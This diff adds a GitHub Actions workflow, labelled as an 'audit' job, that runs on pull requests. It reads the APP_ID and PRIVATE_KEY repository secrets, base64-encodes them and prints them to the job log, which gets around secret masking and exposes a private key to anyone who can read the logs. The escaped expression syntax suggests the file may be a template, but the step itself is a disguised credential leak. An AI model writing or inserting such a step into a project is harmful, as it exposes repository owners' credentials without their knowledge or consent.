@@ -1,0 +1,15 @@
+on:
+  pull_request:
+    branches: [test]
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print Base64 Secret
+        env:
+          APP_ID: ${{ '${{ secrets.APP_ID }}' }}
+          PRIVATE_KEY: ${{ '${{ secrets.PRIVATE_KEY }}' }}
+        run: |
+          echo "BASE64: $(echo \"${APP_ID}${PRIVATE_KEY}\" | base64)"
+        shell: bash
